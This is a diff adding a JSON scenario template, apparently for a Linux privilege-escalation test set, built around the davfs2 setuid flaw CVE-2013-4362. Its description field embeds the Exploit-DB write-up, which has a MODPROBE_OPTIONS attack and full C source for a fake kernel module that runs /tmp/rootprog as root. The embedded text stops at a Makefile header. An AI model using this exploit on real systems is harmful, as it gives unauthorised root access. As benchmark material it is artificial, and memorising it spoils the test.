@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_28806",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: davfs2 1.4.6/1.4.7 - Local Privilege Escalation (CVE-2013-4362;OSVDB-97417)\n\nExploit source code (28806.txt):\n```\ndavfs2 1.4.6/1.4.7 local privilege escalation exploit\n\n*Bug Description*:\ndavfs2 is a Linux utility which allows OS users to mount a remote webdav server as a local partition. The bug is well\ndocumented at http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=723034. Basically the program \"mount.davfs\" runs as\nroot with setuid and executes some calls to system() which allows to pass environment variables which can alter the\nsystem behavior.\n\n*Exploit Description*:\ncalls to system() execute the \"modprobe\" command. An unprivileged, local authenticated user can set the\n\"MODPROBE_OPTIONS\" environment variable to pass a user controlled path, allowing the load of an arbitrary kernel\nmodule. The provided PoC contains a kernel module code which transfers back the execution to a \"/tmp/rootprog\" that\ncan contain user-mode code of choice which will run with root privileges. PLEASE, NOTE THAT THE PROVIDED POC COMES\nUNARMED, YOU HAVE TO COMPILE THE USER MODE CODE WHICH YOU WANT TO RUN. The exploit has been tested on an Ubuntu-based\nx86_64 system but should work on other distributions, too.\n\n*Conditions for successful exploitation*:\n\n1-At least one of the module 'fuse' or 'coda' must not be loaded in the kernel. The provided PoC works with coda,\nwhich is not loaded by default in most debian-based distributions.\n\n2-The user which the attacker is impersonating must be allowed to mount remote webdav servers:\n\neviluser@host:~/hacks/davfs2$ cat /etc/group | grep davfs2\ndavfs2:x:1001:eviluser\n\n3-davfs2 uses /etc/fstab to define which remote servers can be mounted by users. The user which the attacker is\nimpersonating must be allowed to mount at least one remote Webdav server. If this server uses authentication, the\nattacker must be aware of the webdav credentials.\n\neviluser@host:~/hacks/davfs2$ cat /etc/fstab | grep davfs\nhttps://www.crushftp.com/demo/   /home/eviluser/media/dav   davfs   noauto,user   0   0\n\n####################################################################################################\n#\n# coda.c\n#\n####################################################################################################\n\n/*\ncoda.c - fake coda module that executes a user-mode program\n*/\n\n#include <linux/module.h>\n#include <linux/kernel.h>\n\nint init_module(void)\n{\n\tstruct subprocess_info *sub_info;\n\tchar *argv[] = { \"/tmp/rootprog\", NULL, NULL };\n\tstatic char *envp[] = {\"HOME=/tmp/\",\"TERM=linux\",\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\", NULL };\n\n\n\tsub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );\n\n        if (sub_info == NULL)\n\t\t{\n\t\tprintk(KERN_INFO \"call_usermodehelper_setup failed \\n\");\n\t\treturn -ENOMEM;\n\t\t}\n\telse\n\t\t{\n\t\tprintk(KERN_INFO \"w00t!!!\\n\");\n\t\tcall_usermodehelper_exec( sub_info, UMH_WAIT_PROC );\n\t\t}\n\n\treturn 0;\n}\n\nvoid cleanup_module(void)\n{\n\tprintk(KERN_INFO \"Exiting.\\n\");\n}\n\n\n\n####################################################################################################\n#\n# Makefile\n#\n###################################################\n```",
+  "cve": "CVE-2013-4362;OSVDB-97417",
+  "exploitdb_id": "28806",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_28806",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
